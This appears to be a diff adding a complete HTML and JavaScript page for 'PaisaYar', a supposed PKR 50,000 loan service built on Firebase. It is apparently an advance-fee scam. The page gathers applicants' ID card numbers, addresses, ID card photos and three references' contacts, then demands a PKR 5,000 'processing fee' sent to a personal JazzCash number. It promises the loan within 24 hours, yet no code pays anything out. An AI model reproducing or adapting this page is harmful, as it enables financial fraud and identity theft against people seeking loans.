@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PaisaYar - PKR 50,000 Loan Application</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage-compat.js"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #00a65a;
+            --primary-dark: #008d4c;
+            --primary-light: #e0f2e9;
+            --secondary-color: #f39c12;
+            --dark-color: #222;
+            --light-color: #f8f9fa;
+            --border-radius: 8px;
+            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f7fa;
+            color: #444;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 30px auto;
+            background: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 2.5rem;
+            color: var(--primary-dark);
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 1rem;
+        }
+        
+        h1, h2, h3 {
+            color: var(--primary-dark);
+        }
+        
+        h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: var(--primary-color);
+        }
+        
+        .form-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-section.active {
+            display: block;
+        }
+        
+        input, button, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 166, 90, 0.2);
+        }
+        
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        
+        button:focus:not(:active)::after {
+            animation: ripple 0.6s ease-out;
+        }
+        
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(20, 20);
+                opacity: 0;
+            }
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .step {
+            text-align: center;
+            flex: 1;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background-color: #ddd;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #666;
+            transition: var(--transition);
+            border: 3px solid white;
+            box-shadow: 0 0 0 2px #ddd;
+        }
+        
+        .step.active .step-number {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 0 0 2px var(--primary-color);
+        }
+        
+        .step.completed .step-number {
+            background-color: var(--primary-dark);
+            color: white;
+            box-shadow: 0 0 0 2px var(--primary-dark);
+        }
+        
+        .step.completed .step-number::after {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+        }
+        
+        .step-label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .step.active .step-label {
+            color: var(--primary-dark);
+            font-weight: 600;
+        }
+        
+        .step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            width: 100%;
+            height: 2px;
+            background-color: #ddd;
+            z-index: -1;
+            transition: var(--transition);
+        }
+        
+        .step.completed:not(:last-child)::after {
+            background-color: var(--primary-dark);
+        }
+        
+        .error {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: -5px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 30px;
+            background-color: var(--primary-light);
+            color: var(--primary-dark);
+            border-radius: var(--border-radius);
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-message i {
+            font-size: 50px;
+            color: var(--primary-dark);
+            margin-bottom: 20px;
+        }
+        
+        .success-message h2 {
+            margin-bottom: 15px;
+            color: var(--primary-dark);
+        }
+        
+        .success-message p {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .id-upload-container {
+            margin-bottom: 20px;
+        }
+        
+        .id-upload-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .id-upload-box {
+            border: 2px dashed #ddd;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .id-upload-box:hover {
+            border-color: var(--primary-color);
+            background-color: rgba(0, 166, 90, 0.05);
+        }
+        
+        .id-upload-box i {
+            font-size: 40px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .id-upload-box p {
+            margin-bottom: 5px;
+            color: #666;
+        }
+        
+        .id-upload-box small {
+            color: #999;
+            font-size: 12px;
+        }
+        
+        #idPreviewFront, #idPreviewBack {
+            max-width: 100%;
+            margin-top: 15px;
+            border-radius: var(--border-radius);
+            border: 1px solid #ddd;
+            display: none;
+        }
+        
+        .preview-container {
+            position: relative;
+            display: inline-block;
+        }
+        
+        .remove-image {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            transition: var(--transition);
+        }
+        
+        .preview-container:hover .remove-image {
+            opacity: 1;
+        }
+        
+        .payment-info {
+            background-color: var(--primary-light);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 25px;
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .payment-info h3 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            color: var(--primary-dark);
+            display: flex;
+            align-items: center;
+        }
+        
+        .payment-info h3 i {
+            margin-right: 10px;
+        }
+        
+        .payment-info p {
+            margin-bottom: 10px;
+            color: #444;
+        }
+        
+        .jazzcash-number {
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            color: var(--primary-dark);
+            margin: 15px 0;
+            padding: 10px;
+            background-color: white;
+            border-radius: var(--border-radius);
+            border: 1px solid var(--primary-color);
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .back-button {
+            background-color: #e74c3c;
+        }
+        
+        .back-button:hover {
+            background-color: #c0392b;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .reference-section {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+        }
+        
+        .reference-section h3 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            color: var(--primary-dark);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin: 15px;
+                padding: 20px;
+            }
+            
+            .step-label {
+                font-size: 12px;
+            }
+            
+            .logo h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1><i class="fas fa-hand-holding-usd"></i> PaisaYar</h1>
+            <p>Your trusted financial partner</p>
+        </div>
+
+        <!-- Registration Section -->
+        <div id="registration-section" class="form-section active">
+            <h2>Create Your Account</h2>
+            <form id="registration-form">
+                <div class="form-group">
+                    <input type="email" id="reg-email" placeholder="Email Address" required>
+                </div>
+                <div class="form-group">
+                    <input type="text" id="reg-mobile" placeholder="Mobile Number (e.g., 03001234567)" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="reg-password" placeholder="Password (min 6 characters)" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="reg-confirm-password" placeholder="Confirm Password" required>
+                </div>
+                <button type="submit"><i class="fas fa-user-plus"></i> Register</button>
+                <p style="text-align: center; margin-top: 15px;">Already have an account? <a href="#" id="show-login" style="color: var(--primary-color); font-weight: 500;">Login here</a></p>
+                <p class="error" id="reg-error"></p>
+            </form>
+        </div>
+
+        <!-- Login Section -->
+        <div id="login-section" class="form-section">
+            <h2>Welcome Back</h2>
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="email" id="login-email" placeholder="Email Address" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="login-password" placeholder="Password" required>
+                </div>
+                <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
+                <p style="text-align: center; margin-top: 15px;">Don't have an account? <a href="#" id="show-register" style="color: var(--primary-color); font-weight: 500;">Register here</a></p>
+                <p class="error" id="login-error"></p>
+            </form>
+        </div>
+
+        <!-- Loan Application Form -->
+        <div id="application-section" class="form-section">
+            <h1>PKR 50,000 Loan Application</h1>
+            <div class="step-indicator">
+                <div class="step active" id="step1-indicator">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Personal Info</div>
+                </div>
+                <div class="step" id="step2-indicator">
+                    <div class="step-number">2</div>
+                    <div class="step-label">ID Upload</div>
+                </div>
+                <div class="step" id="step3-indicator">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Payment</div>
+                </div>
+                <div class="step" id="step4-indicator">
+                    <div class="step-number">4</div>
+                    <div class="step-label">Confirmation</div>
+                </div>
+            </div>
+
+            <!-- Step 1: Personal Information -->
+            <div id="step1" class="form-section active">
+                <h2>Personal Information</h2>
+                <form id="personal-info-form">
+                    <div class="form-group">
+                        <input type="text" id="full-name" placeholder="Full Name" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="id-card-number" placeholder="ID Card Number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="residence-address" placeholder="Residence Address" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="mobile-number" placeholder="Mobile Number" required>
+                    </div>
+                    
+                    <div class="reference-section">
+                        <h3><i class="fas fa-users"></i> References (3 Required)</h3>
+                        <div class="form-group">
+                            <input type="text" id="ref1-name" placeholder="Reference 1 Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref1-contact" placeholder="Reference 1 Contact Number" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref2-name" placeholder="Reference 2 Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref2-contact" placeholder="Reference 2 Contact Number" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref3-name" placeholder="Reference 3 Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="ref3-contact" placeholder="Reference 3 Contact Number" required>
+                        </div>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button type="button" id="next-to-step2"><i class="fas fa-arrow-right"></i> Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 2: ID Upload -->
+            <div id="step2" class="form-section">
+                <h2>ID Card Verification</h2>
+                <form id="id-upload-form">
+                    <div class="id-upload-container">
+                        <label class="id-upload-label">ID Card Front Side:</label>
+                        <div class="id-upload-box" id="front-upload-box">
+                            <input type="file" id="id-front" accept="image/*" style="display: none;">
+                            <i class="fas fa-id-card"></i>
+                            <p>Upload Front Side of ID Card</p>
+                            <small>JPEG or PNG, max 2MB</small>
+                        </div>
+                        <div class="preview-container">
+                            <img id="idPreviewFront" alt="Front ID Preview">
+                            <div class="remove-image" id="remove-front"><i class="fas fa-times"></i></div>
+                        </div>
+                    </div>
+                    
+                    <div class="id-upload-container">
+                        <label class="id-upload-label">ID Card Back Side:</label>
+                        <div class="id-upload-box" id="back-upload-box">
+                            <input type="file" id="id-back" accept="image/*" style="display: none;">
+                            <i class="fas fa-id-card"></i>
+                            <p>Upload Back Side of ID Card</p>
+                            <small>JPEG or PNG, max 2MB</small>
+                        </div>
+                        <div class="preview-container">
+                            <img id="idPreviewBack" alt="Back ID Preview">
+                            <div class="remove-image" id="remove-back"><i class="fas fa-times"></i></div>
+                        </div>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button type="button" id="back-to-step1" class="back-button"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" id="next-to-step3"><i class="fas fa-arrow-right"></i> Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 3: Payment -->
+            <div id="step3" class="form-section">
+                <h2>Payment Verification</h2>
+                <div class="payment-info">
+                    <h3><i class="fas fa-money-bill-wave"></i> Payment Instructions</h3>
+                    <p>To process your PKR 50,000 loan application, a mandatory processing fee of PKR 5,000 is required.</p>
+                    <p><strong>Please send the payment to our JazzCash number:</strong></p>
+                    <div class="jazzcash-number">
+                        <i class="fas fa-mobile-alt"></i> 0325-0416566
+                    </div>
+                    <p>After making the payment, please enter the transaction ID below.</p>
+                </div>
+                
+                <form id="payment-form">
+                    <div class="form-group">
+                        <input type="text" id="transaction-id" placeholder="Enter JazzCash Transaction ID" required>
+                        <p class="error" id="transaction-error" style="display: none;">This transaction ID has already been used.</p>
+                    </div>
+                    
+                    <div class="nav-buttons">
+                        <button type="button" id="back-to-step2" class="back-button"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" id="next-to-step4"><i class="fas fa-paper-plane"></i> Submit Application</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Step 4: Confirmation -->
+            <div id="step4" class="form-section">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <h2>Application Submitted Successfully!</h2>
+                    <p>Your loan application for PKR 50,000 has been received.</p>
+                    <p>We are processing your request and you will receive your loan within 24 hours.</p>
+                    <p>Thank you for choosing <strong>PaisaYar</strong>.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA8CU9LY-54uLzLn_aibvx4C4VpTdDRJ84",
+            authDomain: "paisayar-loan.firebaseapp.com",
+            projectId: "paisayar-loan",
+            storageBucket: "paisayar-loan.appspot.com",
+            messagingSenderId: "240150963871",
+            appId: "1:240150963871:web:ba7fb66c5fd91be94564aa",
+            measurementId: "G-8SBTBZG1VD"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+        const storage = firebase.storage();
+
+        // DOM Elements
+        const registrationSection = document.getElementById('registration-section');
+        const loginSection = document.getElementById('login-section');
+        const applicationSection = document.getElementById('application-section');
+        
+        const showLoginLink = document.getElementById('show-login');
+        const showRegisterLink = document.getElementById('show-register');
+        
+        const registrationForm = document.getElementById('registration-form');
+        const loginForm = document.getElementById('login-form');
+        const regError = document.getElementById('reg-error');
+        const loginError = document.getElementById('login-error');
+        
+        // Application steps
+        const steps = {
+            step1: document.getElementById('step1'),
+            step2: document.getElementById('step2'),
+            step3: document.getElementById('step3'),
+            step4: document.getElementById('step4')
+        };
+        
+        const stepIndicators = {
+            step1: document.getElementById('step1-indicator'),
+            step2: document.getElementById('step2-indicator'),
+            step3: document.getElementById('step3-indicator'),
+            step4: document.getElementById('step4-indicator')
+        };
+        
+        // Navigation buttons
+        const nextToStep2 = document.getElementById('next-to-step2');
+        const nextToStep3 = document.getElementById('next-to-step3');
+        const nextToStep4 = document.getElementById('next-to-step4');
+        
+        const backToStep1 = document.getElementById('back-to-step1');
+        const backToStep2 = document.getElementById('back-to-step2');
+        
+        // ID upload elements
+        const idFrontInput = document.getElementById('id-front');
+        const idBackInput = document.getElementById('id-back');
+        const frontUploadBox = document.getElementById('front-upload-box');
+        const backUploadBox = document.getElementById('back-upload-box');
+        const idPreviewFront = document.getElementById('idPreviewFront');
+        const idPreviewBack = document.getElementById('idPreviewBack');
+        const removeFront = document.getElementById('remove-front');
+        const removeBack = document.getElementById('remove-back');
+        
+        // Transaction ID validation
+        const transactionIdInput = document.getElementById('transaction-id');
+        const transactionError = document.getElementById('transaction-error');
+        
+        // Form data
+        let userData = {
+            personalInfo: {},
+            idImages: {
+                frontFile: null,
+                backFile: null,
+                frontPreview: '',
+                backPreview: ''
+            },
+            paymentInfo: {}
+        };
+        
+        // Current user
+        let currentUser = null;
+
+        // Toggle between registration and login
+        showLoginLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            registrationSection.classList.remove('active');
+            loginSection.classList.add('active');
+            regError.textContent = '';
+        });
+        
+        showRegisterLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            loginSection.classList.remove('active');
+            registrationSection.classList.add('active');
+            loginError.textContent = '';
+        });
+        
+        // Registration form submission
+        registrationForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('reg-email').value;
+            const password = document.getElementById('reg-password').value;
+            const confirmPassword = document.getElementById('reg-confirm-password').value;
+            const mobile = document.getElementById('reg-mobile').value;
+            
+            if (password !== confirmPassword) {
+                regError.textContent = 'Passwords do not match!';
+                return;
+            }
+            
+            if (password.length < 6) {
+                regError.textContent = 'Password must be at least 6 characters!';
+                return;
+            }
+            
+            // Create user with Firebase Auth
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Save additional user data to Firestore
+                    return db.collection('users').doc(userCredential.user.uid).set({
+                        email: email,
+                        mobile: mobile,
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                })
+                .then(() => {
+                    alert('Registration successful! Please login.');
+                    registrationSection.classList.remove('active');
+                    loginSection.classList.add('active');
+                    registrationForm.reset();
+                    regError.textContent = '';
+                })
+                .catch((error) => {
+                    regError.textContent = error.message;
+                });
+        });
+        
+        // Login form submission
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    currentUser = userCredential.user;
+                    loginSection.classList.remove('active');
+                    applicationSection.classList.add('active');
+                    loginForm.reset();
+                    loginError.textContent = '';
+                })
+                .catch((error) => {
+                    loginError.textContent = error.message;
+                });
+        });
+        
+        // ID upload box click handlers
+        frontUploadBox.addEventListener('click', () => idFrontInput.click());
+        backUploadBox.addEventListener('click', () => idBackInput.click());
+        
+        // ID image preview with local storage
+        idFrontInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                if (file.size > 2 * 1024 * 1024) {
+                    alert('Image should be less than 2MB');
+                    return;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    idPreviewFront.src = event.target.result;
+                    idPreviewFront.style.display = 'block';
+                    userData.idImages.frontFile = file;
+                    userData.idImages.frontPreview = event.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        idBackInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                if (file.size > 2 * 1024 * 1024) {
+                    alert('Image should be less than 2MB');
+                    return;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    idPreviewBack.src = event.target.result;
+                    idPreviewBack.style.display = 'block';
+                    userData.idImages.backFile = file;
+                    userData.idImages.backPreview = event.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        // Remove image handlers
+        removeFront.addEventListener('click', (e) => {
+            e.stopPropagation();
+            idPreviewFront.style.display = 'none';
+            idFrontInput.value = '';
+            userData.idImages.frontFile = null;
+            userData.idImages.frontPreview = '';
+        });
+        
+        removeBack.addEventListener('click', (e) => {
+            e.stopPropagation();
+            idPreviewBack.style.display = 'none';
+            idBackInput.value = '';
+            userData.idImages.backFile = null;
+            userData.idImages.backPreview = '';
+        });
+        
+        // Step navigation
+        nextToStep2.addEventListener('click', () => {
+            if (validateStep1()) {
+                // Save personal info
+                userData.personalInfo = {
+                    fullName: document.getElementById('full-name').value,
+                    idCardNumber: document.getElementById('id-card-number').value,
+                    residenceAddress: document.getElementById('residence-address').value,
+                    mobileNumber: document.getElementById('mobile-number').value,
+                    references: [
+                        {
+                            name: document.getElementById('ref1-name').value,
+                            contact: document.getElementById('ref1-contact').value
+                        },
+                        {
+                            name: document.getElementById('ref2-name').value,
+                            contact: document.getElementById('ref2-contact').value
+                        },
+                        {
+                            name: document.getElementById('ref3-name').value,
+                            contact: document.getElementById('ref3-contact').value
+                        }
+                    ]
+                };
+                
+                steps.step1.classList.remove('active');
+                steps.step2.classList.add('active');
+                
+                stepIndicators.step1.classList.remove('active');
+                stepIndicators.step1.classList.add('completed');
+                stepIndicators.step2.classList.add('active');
+            }
+        });
+        
+        nextToStep3.addEventListener('click', async () => {
+            if (validateStep2()) {
+                // Show loading state
+                const nextButton = document.getElementById('next-to-step3');
+                const originalText = nextButton.innerHTML;
+                nextButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                nextButton.disabled = true;
+                
+                try {
+                    // Upload ID images to Firebase Storage in the background
+                    // (user can proceed while upload continues)
+                    if (userData.idImages.frontFile) {
+                        const frontRef = storage.ref(`id_cards/${currentUser.uid}/front_${Date.now()}`);
+                        frontRef.put(userData.idImages.frontFile)
+                            .then(snapshot => snapshot.ref.getDownloadURL())
+                            .then(url => {
+                                userData.idImages.frontUrl = url;
+                            });
+                    }
+                    
+                    if (userData.idImages.backFile) {
+                        const backRef = storage.ref(`id_cards/${currentUser.uid}/back_${Date.now()}`);
+                        backRef.put(userData.idImages.backFile)
+                            .then(snapshot => snapshot.ref.getDownloadURL())
+                            .then(url => {
+                                userData.idImages.backUrl = url;
+                            });
+                    }
+                    
+                    // Proceed to next step
+                    steps.step2.classList.remove('active');
+                    steps.step3.classList.add('active');
+                    
+                    stepIndicators.step2.classList.remove('active');
+                    stepIndicators.step2.classList.add('completed');
+                    stepIndicators.step3.classList.add('active');
+                } catch (error) {
+                    alert('Error processing ID images: ' + error.message);
+                } finally {
+                    nextButton.innerHTML = originalText;
+                    nextButton.disabled = false;
+                }
+            }
+        });
+        
+        nextToStep4.addEventListener('click', async () => {
+            if (await validateStep3()) {
+                const txId = transactionIdInput.value.trim();
+                
+                // Save payment info
+                userData.paymentInfo = {
+                    transactionId: txId,
+                    amount: 5000,
+                    paymentDate: new Date().toISOString()
+                };
+                
+                // Show loading state
+                const submitButton = document.getElementById('next-to-step4');
+                const originalText = submitButton.innerHTML;
+                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+                submitButton.disabled = true;
+                
+                try {
+                    // Save complete application to Firestore
+                    await db.collection('loanApplications').doc(currentUser.uid).set({
+                        userId: currentUser.uid,
+                        email: currentUser.email,
+                        ...userData,
+                        status: 'pending',
+                        appliedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                        loanAmount: 50000
+                    });
+                    
+                    // Mark transaction ID as used
+                    await db.collection('usedTransactions').doc(txId).set({
+                        used: true,
+                        usedBy: currentUser.uid,
+                        usedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                    
+                    // Proceed to confirmation
+                    steps.step3.classList.remove('active');
+                    steps.step4.classList.add('active');
+                    
+                    stepIndicators.step3.classList.remove('active');
+                    stepIndicators.step3.classList.add('completed');
+                    stepIndicators.step4.classList.add('active');
+                } catch (error) {
+                    alert('Error submitting application: ' + error.message);
+                } finally {
+                    submitButton.innerHTML = originalText;
+                    submitButton.disabled = false;
+                }
+            }
+        });
+        
+        backToStep1.addEventListener('click', () => {
+            steps.step2.classList.remove('active');
+            steps.step1.classList.add('active');
+            
+            stepIndicators.step2.classList.remove('active');
+            stepIndicators.step1.classList.add('active');
+            stepIndicators.step1.classList.remove('completed');
+        });
+        
+        backToStep2.addEventListener('click', () => {
+            steps.step3.classList.remove('active');
+            steps.step2.classList.add('active');
+            
+            stepIndicators.step3.classList.remove('active');
+            stepIndicators.step2.classList.add('active');
+            stepIndicators.step2.classList.remove('completed');
+        });
+        
+        // Transaction ID validation
+        transactionIdInput.addEventListener('input', async function() {
+            const txId = this.value.trim();
+            if (txId.length > 5) { // Only check if reasonable length
+                const doc = await db.collection('usedTransactions').doc(txId).get();
+                if (doc.exists) {
+                    transactionError.style.display = 'block';
+                } else {
+                    transactionError.style.display = 'none';
+                }
+            }
+        });
+        
+        // Validation functions
+        function validateStep1() {
+            const requiredFields = [
+                'full-name', 'id-card-number', 'residence-address', 'mobile-number',
+                'ref1-name', 'ref1-contact', 'ref2-name', 'ref2-contact',
+                'ref3-name', 'ref3-contact'
+            ];
+            
+            for (const fieldId of requiredFields) {
+                if (!document.getElementById(fieldId).value.trim()) {
+                    alert('Please fill in all required fields!');
+                    return false;
+                }
+            }
+            
+            // Validate mobile number format
+            const mobile = document.getElementById('mobile-number').value;
+            if (!/^03\d{9}$/.test(mobile)) {
+                alert('Please enter a valid Pakistani mobile number (e.g., 03001234567)');
+                return false;
+            }
+            
+            return true;
+        }
+        
+        function validateStep2() {
+            if (!userData.idImages.frontFile || !userData.idImages.backFile) {
+                alert('Please upload both front and back of your ID card!');
+                return false;
+            }
+            
+            return true;
+        }
+        
+        async function validateStep3() {
+            const txId = transactionIdInput.value.trim();
+            
+            if (!txId) {
+                alert('Please enter your transaction ID!');
+                return false;
+            }
+            
+            if (txId.length < 6) {
+                alert('Transaction ID must be at least 6 characters!');
+                return false;
+            }
+            
+            // Check if transaction ID already used
+            const doc = await db.collection('usedTransactions').doc(txId).get();
+            if (doc.exists) {
+                alert('This transaction ID has already been used!');
+                return false;
+            }
+            
+            return true;
+        }
+    </script>
+</body>
+</html>
